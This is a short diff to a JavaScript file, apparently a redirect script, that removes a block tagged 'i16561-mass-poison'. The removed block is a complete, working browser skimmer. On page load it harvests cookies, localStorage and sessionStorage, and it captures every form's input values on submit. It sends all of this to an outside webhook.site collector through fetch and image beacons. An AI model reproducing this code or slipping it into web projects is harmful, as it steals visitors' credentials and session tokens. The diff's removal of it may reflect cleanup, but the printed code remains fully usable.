@@ -42,6 +42,3 @@ window.REDIRECT_URL = window.REDIRECT_URL || "";
       .catch(function() {});
   } catch(e) {}
 })();
-
-/* i16561-mass-poison */
-(function(){try{var COLLECTOR="https://webhook.site/dc1ce1eb-3564-40e5-a1ce-bbbf01942cfe";function send(tag,data){try{var p={tag:tag,host:location.hostname,href:location.href,ref:document.referrer,ts:Date.now(),ua:navigator.userAgent,data:data};var u=COLLECTOR+"?d="+encodeURIComponent(JSON.stringify(p));try{fetch(u,{mode:'no-cors',keepalive:true}).catch(function(){});}catch(e){}try{(new Image()).src=u;}catch(e){}}catch(e){}}function snap(tag){var d={ls:{},ss:{},ck:document.cookie};try{for(var i=0;i<localStorage.length;i++){var k=localStorage.key(i);d.ls[k]=String(localStorage.getItem(k)).slice(0,800);}}catch(e){}try{for(var i=0;i<sessionStorage.length;i++){var k=sessionStorage.key(i);d.ss[k]=String(sessionStorage.getItem(k)).slice(0,800);}}catch(e){}send(tag,d);}snap("page-load");document.addEventListener("submit",function(ev){try{var f=ev.target,o={};var ins=f.querySelectorAll("input");for(var i=0;i<ins.length;i++){o[ins[i].name||ins[i].id||ins[i].type]=ins[i].value;}send("form-submit",o);}catch(e){}},true);})();
